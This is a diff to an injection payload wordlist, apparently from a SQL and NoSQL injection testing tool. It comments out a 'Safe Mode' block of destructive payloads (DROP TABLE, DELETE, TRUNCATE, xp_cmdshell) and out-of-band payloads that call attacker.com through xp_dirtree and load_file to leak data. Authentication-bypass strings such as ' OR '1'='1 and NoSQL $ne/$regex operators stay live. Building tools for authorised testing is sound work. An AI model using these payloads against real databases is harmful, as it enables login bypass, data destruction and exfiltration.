@@ -1,3 +1,26 @@
+# ========================================
+# Safe Mode: DESTRUCTIVE Payloads DISABLED
+# The following payloads are disabled by default in safe mode
+# These could damage target systems (DROP, DELETE, TRUNCATE, etc)
+# ========================================
+# '; DROP TABLE users--
+# '; DROP DATABASE testdb--
+# ' OR 1=1; DELETE FROM users--
+# 1' AND DROP TABLE users--
+# '; TRUNCATE TABLE users--
+# admin' OR 1=1; UPDATE users SET admin=1--
+# '; EXEC xp_cmdshell('whoami');--
+# '; EXEC master..xp_dirtree '\\\\attacker.com\\share'--
+# '; SELECT load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\a'))--
+# INSERT INTO users VALUES ('admin'--')
+# ' || '1'=='1
+# "; return true; var a="
+# " || "1"=="1
+# ========================================
+
+# ========================================
+# SAFE: Authentication Bypass Payloads
+# ========================================
 ' OR '1'='1
 ' OR '1'='1' --
 ' OR '1'='1' /*
@@ -118,22 +141,6 @@ admin'/*
 {'$gt': ''}
 {'$ne': ''}
 {'$regex': '.*'}
-' || '1'=='1
-'; return true; var a='
-" || "1"=="1
-
-# ========================================
-# Second-Order SQL Injection
-# ========================================
-admin'-- 
-test'||(SELECT''FROM users WHERE username='admin')--
-INSERT INTO users VALUES ('admin'--')
-
-# ========================================
-# Out-of-Band SQL Injection
-# ========================================
-'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--
-'; SELECT load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\a'))--
 
 # ========================================
 # Database Specific - MySQL
